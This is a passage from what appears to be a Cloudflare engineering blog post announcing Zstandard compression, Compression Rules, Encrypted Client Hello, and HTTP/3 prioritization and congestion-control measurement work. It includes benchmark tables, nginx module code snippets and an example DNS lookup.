algorithm.&nbsp;</p><p>Today, we are excited to announce that Zstandard compression between Cloudflare and browsers is now available to everyone.&nbsp;</p><p>Our testing shows that Zstandard compresses data up to 42% faster than <a href="https://github.com/google/brotli"><u>Brotli</u></a> while achieving nearly equivalent data compression. Additionally, Zstandard outperforms <a href="https://datatracker.ietf.org/doc/html/rfc1952"><u>GZIP</u></a> by approximately 11.3% in compression efficiency, all while maintaining similar compression speeds. This means Zstandard can compress files to the same size as Brotli but in nearly half the time, speeding up your website without sacrificing performance.

This is exciting because compression speed and file size directly impacts latency. When a browser requests a resource from the origin server, the server needs time to compress the data before it’s sent over the network. A faster compression algorithm, like Zstandard, reduces this initial processing time. By also reducing the size of files transmitted over the Internet, better compression means downloads take less time to complete, websites load quicker, and users ultimately get a better experience.</p>

            </figure><h3>Why is compression so important?</h3><p>Website performance is crucial to the success of online businesses. <a href="https://www2.deloitte.com/content/dam/Deloitte/ie/Documents/Consulting/Milliseconds_Make_Millions_report.pdf"><u>Study</u></a> after <a href="https://www.thinkwithgoogle.com/_qs/documents/4290/c676a_Google_MobileSiteSpeed_Playbook_v2.1_digital_4JWkGQT.pdf"><u>study</u></a> has shown that an increased load time <a href="https://www.cloudflare.com/learning/performance/more/website-performance-conversion-rates/"><u>directly affects sales</u></a>. In highly competitive markets, the performance of a website is crucial for success. Just like a physical shop situated in a remote area faces challenges in attracting customers, a slow website encounters similar difficulties in attracting traffic. 

Think about buying a piece of flat pack furniture such as a bookshelf. Instead of receiving the bookshelf fully assembled, which would be expensive and cumbersome to transport, you receive it in a compact, flat box with all the components neatly organized, ready for assembly. The parts are carefully arranged to take up the least amount of space, making the package much smaller and easier to handle. When you get the item, you simply follow the instructions to assemble it to its proper state.&nbsp;</p><p>This is similar to how data compression works. The data is “disassembled” and packed tightly to reduce its size before being transmitted. Once it reaches its destination, it’s “reassembled” to its original form. This compression process reduces the amount of data that needs to be sent, saving bandwidth, reducing costs, and speeding up the transfer, just like how flat pack furniture reduces shipping costs and simplifies delivery logistics.</p><p>However, with compression, there is a tradeoff: time to compress versus the overall compression ratio. A compression ratio is a measure of how much a file's size is reduced during compression. For example, a 10:1 compression ratio means that the compressed file is one-tenth the size of the original. Just like assembling flat-pack furniture takes time and effort, achieving higher compression ratios often requires more processing time. While a higher compression ratio significantly reduces file size — making data transmission faster and more efficient — it may take longer to compress and decompress the data. Conversely, quicker compression methods might produce larger files, leading to faster processing but at the cost of greater bandwidth usage. Balancing these factors is key to optimizing performance in data transmission.</p><p><a href="https://w3techs.com/technologies/details/ce-compression"><u>W3 Technologies</u></a> reports that as of September 12, 2024, 88.6% of websites rely on compression to optimize speed and reduce bandwidth usage. <a href="https://datatracker.ietf.org/doc/html/rfc1952"><u>GZIP</u></a>, introduced in 1996, remains the default algorithm for many, used by 57.0% of sites due to its reasonable compression ratios and fast compression speeds. <a href="https://datatracker.ietf.org/doc/html/rfc7932"><u>Brotli</u></a>, released by Google in 2016, delivers better <a href="https://blog.cloudflare.com/results-experimenting-brotli/"><u>compression ratios</u></a>, leading to smaller file sizes, especially for static assets like JavaScript and CSS, and is used by 45.5% of websites. However, this also means that 11.4% of websites still operate without any compression, missing out on crucial performance improvements.</p><p>As the Internet and its supporting infrastructure have evolved, so have user demands for faster, more efficient performance. This growing need for higher efficiency without compromising speed is where Zstandard comes into play.</p><h3>Enter Zstandard</h3><p>Zstandard offers higher compression ratios comparable to GZIP, but with significantly faster compression and decompression speeds than Brotli. This makes it ideal for real-time applications that require both speed and relatively high compression ratios.</p><p>To understand Zstandard's advantages, it's helpful to know about <a href="https://blog.cloudflare.com/cloudflare-fights-cancer/"><u>Zlib</u></a>. Zlib was developed in the mid-1990s based on the <a href="https://en.wikipedia.org/wiki/DEFLATE"><u>DEFLATE</u></a> compression algorithm, which combines <a href="https://www.cloudflare.com/en-gb/learning/performance/glossary/what-is-image-compression/"><u>LZ77 and Huffman coding</u></a> to reduce file sizes. While Zlib has been a compression standard since the mid-1990s and is used in Cloudflare’s <a href="https://blog.cloudflare.com/cloudflare-fights-cancer/"><u>open-source</u></a> GZIP implementation, its design is limited by a 32 KB sliding window — a constraint from the memory limitations of that era. This makes Zlib less efficient on modern hardware, which can access far more memory.</p><p>Zstandard enhances Zlib by leveraging modern innovations and hardware capabilities. Unlike Zlib’s fixed 32 KB window, Zstandard has no strict memory constraints and can theoretically address terabytes of memory. However,&nbsp; in practice, it typically uses much less, around 1 MB at lower compression levels. This flexibility allows Zstandard to buffer large amounts of data, enabling it to identify and compress repeating patterns more effectively. Zstandard also employs <a href="https://engineering.fb.com/2016/08/31/core-infra/smaller-and-faster-data-compression-with-zstandard/#:~:text=Repcode%20modeling,within%20zlib/gzip."><u>repcode modeling</u></a> to efficiently compress structured data with repetitive sequences, further reducing file sizes and enhancing its suitability for modern compression needs.</p><p>Zstandard is optimized for modern CPUs, which can execute multiple tasks simultaneously using multiple Arithmetic Logic Units (ALUs) that are used to perform mathematical tasks. Zstandard achieves this by processing data in parallel streams, dividing it into multiple parts that are processed concurrently. <a href="https://chromium.googlesource.com/external/github.com/klauspost/compress/+/refs/heads/master/huff0/"><u>The Huffman decoder, Huff0</u></a>, can decode multiple symbols in parallel on a single CPU core, and when combined with multi-threading, this leads to substantial speed improvements during both compression and decompression.</p><p>Zstandard’s branchless design is a crucial innovation that enhances CPU efficiency, especially in modern processors. To understand its significance, consider how CPUs execute instructions.</p><p>Modern CPUs use pipelining, where different stages of an instruction are processed simultaneously—like a production line—keeping all parts of the processor busy. However, when CPUs encounter a branch, such as an 'if-else' decision, they must make a <a href="https://blog.cloudflare.com/branch-predictor/"><u>branch prediction</u></a> to guess the next step. If the prediction is wrong, the pipeline must be cleared and restarted, causing slowdowns.</p><p>Zstandard avoids this issue by eliminating conditional branching. Without relying on branch predictions, it ensures the CPU can execute instructions continuously, keeping the pipeline full and avoiding performance bottlenecks.</p><p>A key feature of Zstandard is its use of <a href="https://www.rfc-editor.org/rfc/rfc8478.html#section-4.1"><u>Finite State Entropy (FSE)</u></a>, an advanced compression method that encodes data more efficiently based on probability. FSE, built on the <a href="https://en.wikipedia.org/wiki/Asymmetric_numeral_systems"><u>Asymmetric Numeral System (ANS)</u></a>, allows Zstandard to use fractional bits for encoding, unlike traditional Huffman coding, which only uses whole bits. This allows heavily repeated data to be compressed more tightly without sacrificing efficiency.</p><h3>Zstandard findings</h3><p>In the third quarter of 2024, we conducted extensive tests on our new Zstandard compression module, focusing on a 24-hour period where we switched the default compression algorithm from Brotli to Zstandard across our Free plan traffic. This experiment spanned billions of requests, covering a wide range of file types and sizes, including HTML, CSS, and JavaScript. The results were very promising, with significant improvements in both compression speed and file size reduction, leading to faster load times and more efficient bandwidth usage.</p><h4>Compression ratios</h4><p>In terms of compression efficiency, Zstandard delivers impressive results. Below are the average compression ratios we observed during our testing.</p><table><tbody><tr><td><p><b>Compression Algorithm</b></p></td><td><p><b>Average Compression Ratio</b></p></td></tr><tr><td><p>GZIP</p></td><td><p>2.56</p></td></tr><tr><td><p>Zstandard</p></td><td><p>2.86</p></td></tr><tr><td><p>Brotli</p></td><td><p>3.08</p></td></tr></tbody></table>

            </figure><p>As the table shows, Zstandard achieves an average compression ratio of <b>2.86:1</b>, which is notably higher than gzip's <b>2.56:1</b> and close to Brotli’s <b>3.08:1</b>. While Brotli slightly edges out Zstandard in terms of pure compression ratio, what is particularly exciting is that we are only using Zstandard’s default compression level of 3 (out of 22) on our traffic. In the fourth quarter of 2024, we plan to experiment with higher compression levels and multithreading capabilities to further enhance Zstandard’s performance and optimize results even more.</p><h4>Compression speeds</h4><p>What truly sets Zstandard apart is its speed. Below are the average times to compress data from our traffic-based tests measured in milliseconds:</p><table><tbody><tr><td><p><b>Compression Algorithm</b></p></td><td><p><b>Average Time to Compress (ms)</b></p></td></tr><tr><td><p>GZIP</p></td><td><p>0.872</p></td></tr><tr><td><p>Zstandard</p></td><td><p>0.848</p></td></tr><tr><td><p>Brotli</p></td><td><p>1.544</p></td></tr></tbody></table>
            <figure>
            
            <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/15AxPyO1PmyV6hDRRjBznu/8741362637f3df4db34eb4e40fdc0c12/image10.png" alt="" width="1999" height="1234" loading="lazy">
            
            </figure><p>Zstandard not only compresses data efficiently, but it also does so <b>42% faster</b> than Brotli, with an average compression time of <b>0.848 ms</b> compared to Brotli’s <b>1.544 ms</b>. It even outperforms gzip, which compresses at <b>0.872 ms</b> on average.</p><p>From our results, we have found Zstandard strikes an excellent balance between achieving a high compression ratio and maintaining fast compression speed, making it particularly well-suited for dynamic content such as HTML and non-cacheable sensitive data. Zstandard can compress these responses from the origin quickly and efficiently, saving time compared to Brotli while providing better compression ratios than GZIP.</p><h3>Implementing Zstandard at Cloudflare</h3><p>To implement Zstandard compression at Cloudflare, we needed to build it into our Nginx-based service which already handles GZIP and Brotli compression. Nginx is modular by design, with each module performing a specific function, such as compressing a response. Our custom Nginx module leverages Nginx's function 'hooks' — specifically, the header filter and body filter — to implement Zstandard compression.</p><h4>Header filter</h4><p>The header filter allows us to access and modify response headers. For example, Cloudflare only compresses responses above a certain size (50 bytes for Zstandard), which is enforced with this code:</p>
            <pre><code>if (r-&gt;headers_out.content_length_n != -1 &amp;&amp;
    r-&gt;headers_out.content_length_n &lt; conf-&gt;min_length) {
    return ngx_http_next_header_filter(r);
}</code></pre>
            <p>Here, we check the "Content-Length" header. If the content length is less than our minimum threshold, we skip compression and let Nginx execute the next module.</p><p>We also need to ensure the content is not already compressed by checking the "Content-Encoding" header:</p>
            <pre><code>if (r-&gt;headers_out.content_encoding &amp;&amp;
    r-&gt;headers_out.content_encoding-&gt;value.len) {
    return ngx_http_next_header_filter(r);
}</code></pre>
            <p>If the content is already compressed, the module is bypassed, and Nginx proceeds to the next header filter.</p><h4>Body filter</h4><p>The body filter hook is where the actual processing of the response body occurs. In our case, this involves compressing the data with the Zstandard encoder and streaming the compressed data back to the client. Since responses can be very large, it's not feasible to buffer the entire response in memory, so we manage internal memory buffers carefully to avoid running out of memory.</p><p>The Zstandard library is well-suited for streaming compression and provides the <code>ZSTD_compressStream2</code> function:</p>
            <pre><code>ZSTDLIB_API size_t ZSTD_compressStream2(ZSTD_CCtx* cctx,
                                        ZSTD_outBuffer* output,
                                        ZSTD_inBuffer* input,
                                        ZSTD_EndDirective endOp);</code></pre>
            <p>This function can be called repeatedly with chunks of input data to be compressed. It accepts input and output buffers and an "operation" parameter (<code>ZSTD_EndDirective endOp</code>) that controls whether to continue feeding data, flush the data, or finalize the compression process.</p><p>Nginx uses a "flush" flag on memory buffers to indicate when data can be sent. Our module uses this flag to set the appropriate Zstandard operation:</p>
            <pre><code>switch (zstd_operation) {
    case ZSTD_e_continue: {
        if (flush) {
            zstd_operation = ZSTD_e_flush;
        }
    }
}
</code></pre>
            <p>This logic allows us to switch from the "ZSTD_e_continue" operation, which feeds more input data into the encoder, to "ZSTD_e_flush", which extracts compressed data from the encoder.</p><h4>Compression cycle</h4><p>The compression module operates in the following cycle:</p><ol><li><p>Receive uncompressed data.</p></li><li><p>Locate an internal buffer to store compressed data.</p></li><li><p>Compress the data with Zstandard.</p></li><li><p>Send the compressed data back to the client.</p></li></ol><p>Once a buffer is filled with compressed data, it’s passed to the next Nginx module and eventually sent to the client. When the buffer is no longer in use, it can be recycled, avoiding unnecessary memory allocation. This process is managed as follows:</p>
            <pre><code>if (free) {
    // A free buffer is available, so use it
    buffer = free;
} else if (buffers_used &lt; maximum_buffers) {
    // No free buffers, but we're under the limit, so allocate a new one
    buffer = create_buf();
} else {
    // No free buffers and can't allocate more
    err = no_memory;
}
</code></pre>
            <h4>Handling backpressure</h4><p>If no buffers are available, it can lead to backpressure — a situation where the Zstandard module generates compressed data faster than the client can receive it. This causes data to become "stuck" inside Nginx, halting further compression due to memory constraints. In such cases, we stop compression and send an empty buffer to the next Nginx module, allowing Nginx to attempt to send the data to the client again. When successful, this frees up memory buffers that our module can reuse, enabling continued streaming of the compressed response without buffering the entire response in memory.</p><h3>What's next? Compression dictionaries</h3><p>The future of Internet compression lies in the use of <a href="https://datatracker.ietf.org/doc/draft-ietf-httpbis-compression-dictionary/"><u>compression dictionaries</u></a>. Both Brotli and Zstandard support dictionaries, offering up to <a href="https://developer.chrome.com/blog/shared-dictionary-compression"><u>90% improvement</u></a> on compression levels compared to using static dictionaries.&nbsp;</p><p>Compression dictionaries store common patterns or sequences of data, allowing algorithms to compress information more efficiently by referencing these patterns rather than repeating them. This concept is akin to how an iPhone's predictive text feature works. For example, if you frequently use the phrase "On My Way," you can customize your iPhone’s dictionary to recognize the abbreviation "OMW" and automatically expand it to "On My Way" when you type it, saving the user from typing six extra letters.</p><table><tbody><tr><td><p>O</p></td><td><p>M</p></td><td><p>W</p></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><p>O</p></td><td><p>n</p></td><td></td><td><p>M</p></td><td><p>y</p></td><td></td><td><p>W</p></td><td><p>a</p></td><td><p>y</p></td></tr></tbody></table><p>Traditionally, compression algorithms use a static dictionary defined by its RFC that is shared between clients and origin servers. This static dictionary is designed to be broadly applicable, balancing size and compression effectiveness for general use. However, Zstandard and Brotli support custom dictionaries, tailored specifically to the content being sent to the client. For example, Cloudflare could create a specialized dictionary that focuses on frequently used terms like “Cloudflare”. This custom dictionary would compress these terms more efficiently, and a browser using the same dictionary could decode them accurately, leading to significant improvements in compression and performance.</p><p>In the future, we will enable users to leverage origin-generated dictionaries for Zstandard and Brotli to enhance compression. Another exciting area we're exploring is the use of AI to create these dictionaries dynamically without them needing to be generated at the origin. By analyzing data streams in real-time, Cloudflare could develop context-aware dictionaries tailored to the specific characteristics of the data being processed. This approach would allow users to significantly improve both compression ratios and processing speed for their applications.</p><h3>Compression Rules for everyone</h3><p>Today we’re also excited to announce the introduction of <a href="https://developers.cloudflare.com/rules/compression-rules/"><u>Compression Rules</u></a> for all our customers. By default, Cloudflare will automatically compress certain content types based on their <a href="https://developers.cloudflare.com/speed/optimization/content/brotli/content-compression"><u>Content-Type headers</u></a>. Customers can use compression rules to optimize how and what Cloudflare compresses. This feature was previously exclusive to our Enterprise plans.

Compression Rules is built on the same robust framework as our other rules products, such as Origin Rules, Custom Firewall Rules, and Cache Rules, with additional fields for Media Type and Extension Type. This allows you to easily specify the content you wish to compress, providing granular control over your site’s performance optimization.</p><p>Compression rules are now available on all our pay-as-you-go plans and will be added to free plans in October 2024. This feature was previously exclusive to our Enterprise customers. In the table below, you’ll find the updated limits, including an increase to 125 Compression Rules for Enterprise plans, aligning with our other rule products' quotas.</p><table><tbody><tr><td><p><b>Plan Type</b></p></td><td><p><b>Free*</b></p></td><td><p><b>Pro</b></p></td><td><p><b>Business</b></p></td><td><p><b>Enterprise</b></p></td></tr><tr><td><p>Available Compression Rules</p></td><td><p>10</p></td><td><p>25</p></td><td><p>50</p></td><td><p>125</p></td></tr></tbody></table><h3>Using Compression Rules to enable Zstandard</h3><p>To integrate our Zstandard module into our platform, we also added support for it within our Compression Rules framework. This means that customers can now specify Zstandard as their preferred compression method, and our systems will automatically enable the Zstandard module in Nginx, disabling other compression modules when necessary.</p><p>The <code>Accept-Encoding</code> header determines which compression algorithms a client supports. If a browser supports Zstandard (<code>zstd</code>), and both Cloudflare and the zone have enabled the feature, then Cloudflare will return a Zstandard compressed response.</p>

With web traffic growing more complex and interconnected, it's critical to keep both performance and privacy in balance. This is where technologies like Encrypted Client Hello (ECH) come into play, securing connections without sacrificing speed.</p><p>Ten years ago, we embarked on a mission to create a more secure and encrypted web. At the time, much of the Internet remained unencrypted, leaving user data vulnerable to interception. On September 27, 2014, we took a major step forward by enabling HTTPS for free for all Cloudflare customers. Overnight, we doubled the size of the encrypted web. This set the stage for a more secure Internet, ensuring that encryption was not a privilege limited by budget but a right accessible to everyone.</p><p>Since then, both Cloudflare and the broader community have helped encrypt more of the Internet. Projects like <a href="https://letsencrypt.org/"><u>Let's Encrypt</u></a> launched to make certificates free for everyone. Cloudflare invested to encrypt more of the connection, and future-proof that encryption from coming technologies like <a href="https://blog.cloudflare.com/post-quantum-for-all/"><u>quantum computers</u></a>. We've always believed that it was everyone's right, regardless of your budget, to have an encrypted Internet at no cost.</p><p>One of the last major challenges has been securing the SNI (Server Name Identifier), which remains exposed in plaintext during the TLS handshake. This is where Encrypted Client Hello (ECH) comes in, and today, we are proud to announce that we're closing that gap.&nbsp;</p><p>Cloudflare announced support for <a href="https://blog.cloudflare.com/announcing-encrypted-client-hello/"><u>Encrypted Client Hello (ECH)</u></a> in 2023 and has continued to enhance its implementation in collaboration with our Internet browser partners. During a TLS handshake, one of the key pieces of information exchanged is the <a href="https://www.cloudflare.com/learning/ssl/what-is-sni/"><u>Server Name Indication (SNI)</u></a>, which is used to initiate a secure connection. Unfortunately, the SNI is sent in plaintext, meaning anyone can read it. Imagine hand-delivering a letter — anyone following you can see where you're delivering it, even if they don’t know the contents. With ECH, it is like sending the same confidential letter to a P.O. Box. You place your sensitive letter in a sealed inner envelope with the actual address. Then, you put that envelope into a larger, standard envelope addressed to a public P.O. Box, trusted to securely forward your intended recipient. The larger envelope containing the non-sensitive information is visible to everyone, while the inner envelope holds the confidential details, such as the actual address and recipient. Just as the P.O. Box maintains the anonymity of the true recipient’s address, ECH ensures that the SNI remains protected.&nbsp;</p><p>While encrypting the SNI is a primary motivation for ECH, its benefits extend further. ECH encrypts the entire Client Hello, ensuring user privacy and enabling TLS to evolve without exposing sensitive connection data. By securing the full handshake, ECH allows for flexible, future-proof encryption designs that safeguard privacy as the Internet continues to grow.</p><h3>How ECH works</h3><p>Encrypted Client Hello (ECH) introduces a layer of privacy by dividing the ClientHello message into two distinct parts: a ClientHelloOuter and a ClientHelloInner.&nbsp;</p><ul><li><p><b>ClientHelloOuter</b>: This part remains unencrypted and contains innocuous values for sensitive TLS extensions. It sets the SNI to Cloudflare’s public name, currently set to cloudflare-ech.com. Cloudflare manages this domain and possesses the necessary certificates to handle TLS negotiations for it.</p></li><li><p><b>ClientHelloInner</b>: This part is encrypted with a public key and includes the actual server name the client wants to visit, along with other sensitive TLS extensions. The encryption scheme ensures that this sensitive data can only be decrypted by the client-facing server, which in our case is Cloudflare.</p></li></ul><p>During the TLS handshake, the ClientHelloOuter reveals only the public name (e.g., cloudflare-ech.com), while the encrypted ClientHelloInner carries the real server name. As a result, intermediaries observing the traffic will only see cloudflare-ech.com in plaintext, concealing the actual destination.</p>

          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5C7EUMmlYp3gmvfvnbeKul/56ba77eafb4a3f9593510c50242aeb44/image13.png" alt="" width="1574" height="1437" loading="lazy">
          </figure><p>The design of ECH effectively addresses many challenges in securely deploying handshake encryption, thanks to the collaborative efforts within the <a href="https://datatracker.ietf.org/doc/draft-ietf-tls-esni/"><u>IETF community</u></a>. The key to ECH’s success is its integration with other IETF standards, including the new <a href="https://datatracker.ietf.org/doc/html/rfc9460"><u>HTTPS DNS resource record</u></a>, which enables HTTPS endpoints to advertise different TLS capabilities and simplifies key distribution. By using <a href="https://blog.cloudflare.com/dns-encryption-explained/"><u>Encrypted DNS</u></a> methods, browsers and clients can anonymously query these HTTPS records. These records contain the ECH parameters needed to initiate a secure connection.&nbsp;</p><p>ECH leverages the <a href="https://blog.cloudflare.com/hybrid-public-key-encryption/"><u>Hybrid Public Key Encryption (HPKE)</u></a> standard, which streamlines the handshake encryption process, making it more secure and easier to implement. Before initiating a layer 4 connection, the user’s browser makes a DNS request for an HTTPS record, and zones with ECH enabled will include an ECH configuration in the HTTPS record containing an encryption public key and some associated metadata. For example, looking at the zone cloudflare-ech.com, you can see the following record returned:</p>
            <pre><code>dig cloudflare-ech.com https +short


1 . alpn="h3,h2" ipv4hint=104.18.10.118,104.18.11.118 ech=AEX+DQBB2gAgACD1W1B+GxY3nZ53Rigpsp0xlL6+80qcvZtgwjsIs4YoOwAEAAEAAQASY2xvdWRmbGFyZS1lY2guY29tAAA= ipv6hint=2606:4700::6812:a76,2606:4700::6812:b76</code></pre>
            <p>Aside from the public key used by the client to encrypt ClientHelloInner and other <a href="https://www.ietf.org/archive/id/draft-ietf-tls-esni-20.html#name-encrypted-clienthello-confi"><u>parameters</u></a> that specify the ECH configuration, the configured public name is also present.</p>
            <pre><code>Y2xvdWRmbGFyZS1lY2guY29t</code></pre>
            <p>When the string is decoded it reveals:</p>
            <pre><code>cloudflare-ech.com</code></pre>
            <p>This public name is then used by the client in the ClientHelloOuter.</p><h3>Practical implications</h3><p>With ECH, any observer monitoring the traffic between the client and Cloudflare will see only uniform TLS handshakes that appear to be directed towards <code>cloudflare-ech.com</code>, regardless of the actual website being accessed. For instance, if a user visits <code>example.com</code>, intermediaries will not discern this specific destination but will only see <code>cloudflare-ech.com</code> in the visible handshake data.&nbsp;</p><h3>The problem with middleboxes</h3><p>In a basic HTTPS connection, a browser (client) establishes a TLS connection directly with an origin server to send requests and download content. However, many connections on the Internet do not go directly from a browser to the server but instead pass through some form of proxy or middlebox (often referred to as a "monster-in-the-middle" or MITM). This routing through intermediaries can occur for various reasons, both benign and malicious.</p><p>One common type of HTTPS interceptor is the TLS-terminating forward proxy. This proxy sits between the client and the destination server, transparently forwarding and potentially modifying traffic. To perform this task, the proxy terminates the TLS connection from the client, decrypts the traffic, and then re-encrypts and forwards it to the destination server over a new TLS connection. To avoid browser certificate validation errors, these forward proxies typically require users to install a root certificate on their devices. This root certificate allows the proxy to generate and present a trusted certificate for the destination server, a process often managed by network administrators in corporate environments, as seen with <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/"><u>Cloudflare WARP</u></a>. These services can help prevent sensitive company data from being transmitted to unauthorized destinations, safeguarding confidentiality.</p>
          <figure>
          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2xfA7PB61KxnbZ96XRLahh/4392b3cb65ee791a334cd182fafd8287/image8.png" alt="" width="1999" height="1058" loading="lazy">
          </figure><p>However, TLS-terminating forward proxies may not be equipped to handle Encrypted Client Hello (ECH) correctly, especially if the MITM proxy and the client facing ECH server belong to different entities.&nbsp; Because the MITM proxy will terminate the TLS connection without being ECH aware, it may provide a valid certificate for the public name (in our case, cloudflare-ech.com) without being able to decrypt the ClientHelloInner or provide a new public key for the client to use. In this case, the client considers ECH to be disabled, which means you lose out on both ECH and pay the cost of an extra round trip.&nbsp;</p><p>We also observed that specific Cloudflare setups, such as <a href="https://developers.cloudflare.com/dns/cname-flattening/"><u>CNAME Flattening</u></a> and <a href="https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/saas-customers/how-it-works/"><u>Orange-to-Orange configurations</u></a>, could cause ECH to break. This issue arose because the end destination for these connections did not support TLS 1.3, preventing ECH from being processed correctly. Fortunately, in close collaboration with our browser partners, we implemented a fallback in our <a href="https://boringssl.googlesource.com/boringssl/+/d274b1bacdca36f3941bf78e43dc38acf676a1a8"><u>BoringSSL</u></a> implementation that handles TLS terminations. This fallback allows browsers to retry connections over TLS 1.2 without ECH, ensuring that a connection can be established and not break.</p><p>As a result of these improvements, we have enabled ECH by default for all Free plans, while all other plan types can manually enable it through their <a href="https://dash.cloudflare.com/?to=/:account/:zone/ssl-tls/edge-certificates#ech-card"><u>Cloudflare dashboard</u></a> or via the API. We are excited to support ECH at scale, enhancing the privacy and security of users' browsing activities. ECH plays a crucial role in safeguarding online interactions from potential eavesdroppers and maintaining the confidentiality of web activities.</p><h2>HTTP/3 Prioritization and QUIC congestion control</h2><p>Two other areas we are investing in to improve performance for all our customers are <a href="https://blog.cloudflare.com/better-http-3-prioritization-for-a-faster-web/"><u>HTTP/3 Prioritization</u></a> and QUIC congestion control.&nbsp;</p><p>HTTP/3 Prioritization focuses on efficiently managing the order in which web assets are loaded, thereby improving web performance by ensuring critical assets are delivered faster. HTTP/3 Prioritization uses Extensible Priorities to simplify prioritization with two parameters: urgency (ranging from 0-7) and a true/false value indicating whether the resource can be processed progressively. This allows resources like HTML, CSS, and images to be prioritized based on importance.</p><p>On the other hand, QUIC congestion control aims to optimize the flow of data, preventing network bottlenecks and ensuring smooth, reliable transmission even under heavy traffic conditions.&nbsp;</p><p>Both of these improvements significantly impact how Cloudflare’s network serves requests to clients. Before deploying these technologies across our global network, which handles peak traffic volumes of over 80 million requests per second, we first developed a reliable method to measure their impact through rigorous experimentation.</p><h3>Measuring impact</h3><p>Accurately measuring the impact of features implemented by Cloudflare for our customers is crucial for several reasons. These measurements ensure that optimizations related to performance, security, or reliability deliver the intended benefits without introducing new issues. Precise measurement validates the effectiveness of these changes, allowing Cloudflare to assess improvements in metrics such as load times, user experience, and overall site security. One of the best ways to measure performance changes is through aggregated real-world data.</p><p><a href="https://developers.cloudflare.com/pages/how-to/web-analytics/"><u>Cloudflare Web Analytics</u></a> offers free, privacy-first analytics for your website, helping you understand the performance of your web pages as experienced by your visitors. Real User Metrics (RUM) is a vital tool in web performance optimization, capturing data from real users interacting with a website, providing insights into site performance under real-world conditions. RUM tracks various metrics directly from the user's device, including load times, resource usage, and user interactions. This data is essential for understanding the actual user experience, as it reflects the diverse environments and conditions under which the site is accessed.</p><p>A key performance indicator measured through RUM is <a href="https://web.dev/articles/vitals#core-web-vitals"><u>Core Web Vitals (CWV)</u></a>, a set of metrics defined by Google that quantify crucial aspects of user experience on the web. CWV focuses on three main areas: loading performance, interactivity, and visual stability. The specific metrics include Largest Contentful Paint (LCP), which measures loading performance; First Input Delay (FID), which gauges interactivity; and Cumulative Layout Shift (CLS), which assesses visual stability. By using the CWV measurement in RUM, developers can monitor and optimize their applications to ensure a smoother, faster, and more stable user experience and track the impact of any changes they release.</p><p>Over the last three months we have developed the capability to include valuable information in Server-Timing response headers. When a page that uses Cloudflare Web Analytics is loaded in a browser, the privacy-first client-side script from Web Analytics collects browser metrics and server-timing headers, then sends back this performance data. This data is ingested, aggregated, and made available for querying. The server-timing header includes Layer 4 information, such as Round-Trip Time (RTT) and protocol type (TCP or QUIC). Combined with Core Web Vitals data, this allows us to determine whether an optimization has positively impacted a request compared to a control sample. This capability enables us to release large-scale changes such as HTTP/3 Prioritization or BBR with a clear understanding of their impact across our global network.</p><p>An example of this header contains several key properties that provide valuable information about the network performance as observed by the server:</p>
            <pre><code>server-timing: cfL4;desc="?proto=TCP&amp;rtt=7337&amp;sent=8&amp;recv=8&amp;lost=0&amp;retrans=0&amp;sent_bytes=3419&amp;recv_bytes=832&amp;delivery_rate=548023&amp;cwnd=25&amp;unsent_bytes=0&amp;cid=94dae6b578f91145&amp;ts=225</code></pre>
            <ul><li><p><b>proto</b>: Indicates the transport protocol used</p></li><li><p><b>rtt</b>: Round-Trip Time (RTT), representing the duration of the network round trip as measured by the layer 4 connection using a smoothing algorithm.</p></li><li><p><b>sent</b>: Number of packets sent.</p></li><li><p><b>recv</b>: Number of packets received.</p></li><li><p><b>lost</b>: Number of packets lost.</p></li><li><p><b>retrans</b>: Number of retransmitted packets.</p></li><li><p><b>sent_bytes</b>: Total number of bytes sent.</p></li><li><p><b>recv_bytes</b>: Total number of bytes received.</p></li><li><p><b>delivery_rate</b>: Rate of data delivery, an instantaneous measurement in bytes per second.</p></li><li><p><b>cwnd</b>: Congestion Window, an instantaneous measurement of packet or byte count depending on the protocol.</p></li><li><p><b>unsent_bytes</b>: Number of bytes not yet sent.</p></li><li><p><b>cid</b>: A 16-byte hexadecimal opaque connection ID.</p></li><li><p><b>ts</b>: Timestamp in milliseconds, representing when the data was captured.</p></li></ul><p>This real-time collection of performance data via RUM and Server-Timing headers allows Cloudflare to make data-driven decisions that directly enhance user experience. By continuously analyzing these detailed network and performance insights, we can ensure that future optimizations, such as HTTP/3 Prioritization or BBR deployment, are delivering tangible benefits for our customers.</p><h3>Enabling HTTP/3 Prioritization for all plans</h3><p>As part of our focus on improving observability through the integration of the server-timing header, we implemented several minor changes to optimize QUIC handshakes. Notably, we observed positive improvements in our telemetry due to the Layer 4 observability enhancements provided by the server-timing header. These internal findings coincided with third-party measurements, which showed similar improvements in handshake performance.</p><p>In the fourth quarter of 2024, we will apply the same experimental methodology to the HTTP/3 Prioritization support announced during Speed Week 2023. <a href="https://blog.cloudflare.com/better-http-3-prioritization-for-a-faster-web/"><u>HTTP/3 Prioritization</u></a> is designed to enhance the efficiency and speed of loading web pages by intelligently managing the order in which web assets are delivered to users. This is crucial because modern web pages are composed of numerous elements — such as images, scripts, and stylesheets — that vary in importance. Proper prioritization ensures that critical elements, like primary content and layout, load first, delivering a faster and more seamless browsing experience.</p><p>We will use this testing framework to measure performance improvements before enabling the feature across all plan types. This process allows us not only to quantify the benefits but, most importantly, to ensure there are no performance regressions.</p><h3>Congestion control</h3><p>Following the completion of the HTTP/3 Prioritization experiments we will then begin testing different congestion control algorithms, specifically focusing on <a href="https://cloud.google.com/blog/products/networking/tcp-bbr-congestion-control-comes-to-gcp-your-internet-just-got-faster"><u>BBR</u></a> (Bottleneck Bandwidth and Round-trip propagation time) version 3. Congestion control is a crucial mechanism in network communication that aims to optimize data transfer rates while avoiding network congestion. When too much data is sent too quickly over a network, it can lead to congestion, causing packet loss, delays, and reduced overall performance. Think of a busy highway during rush hour. If too many cars (data packets) flood the highway at once, traffic jams occur, slowing everyone down.</p>
          <figure>
          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1kR4Ekkg2eUPzO4Lj8CrjY/bc490038849d8260f845a225acfc7e5d/image6.png" alt="" width="1999" height="1000" loading="lazy">
          </figure><p>Congestion control algorithms act like traffic managers, regulating the flow of data to prevent these “traffic jams,” ensuring that data moves smoothly and efficiently across the network. Each side of a connection runs an algorithm in real time, dynamically adjusting the flow of data based on the current and predicted network conditions.

